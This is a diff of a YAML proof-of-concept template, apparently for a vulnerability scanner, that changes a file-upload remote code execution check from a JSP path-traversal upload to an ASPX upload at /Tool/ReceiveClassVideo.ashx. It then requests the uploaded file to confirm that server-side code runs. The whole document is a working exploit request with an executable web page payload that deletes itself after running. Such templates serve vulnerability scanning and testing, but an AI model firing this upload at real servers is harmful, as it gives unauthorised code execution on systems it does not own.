@@ -1,5 +1,4 @@
 name: poc-yaml-file-upload-rce
-manual: true
 transport: http
 set:
   rfilename: randomLowercase(4)
@@ -10,24 +9,24 @@ rules:
   r1:
     request:
       method: POST
-      path: /feed/UploadFile.do;.js.jsp
+      path: /Tool/ReceiveClassVideo.ashx?file_tmid={{rfilename}}&orgid=1&classID=1
       headers:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"uplo_file\"; filename=\"/../../../../{{rfilename}}.jsp\"\r\n\
-        Content-Type: image/jpeg\r\n\
-        \r\n\
-        <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: response.status == 200 && response.body_string.contains("\"url\":\"/feed/ShowImage.do")&& response.body_string.contains(rfilename)
+      body: |-
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="{{rfilename}}.aspx"
+        Content-Type: image/jpeg
 
+        <%@Page Language="C#"%>
+        <%Response.Write({{s1}}*{{s2}});System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
   r2:
     request:
       method: GET
-      path: /{{rfilename}}.jsp;.js.jsp
+      path: /Upload/AD_Info/1/{{rfilename}}.aspx
     expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
 expression: r1() && r2()
 detail:
   author: k3ppf0r
+  links: []
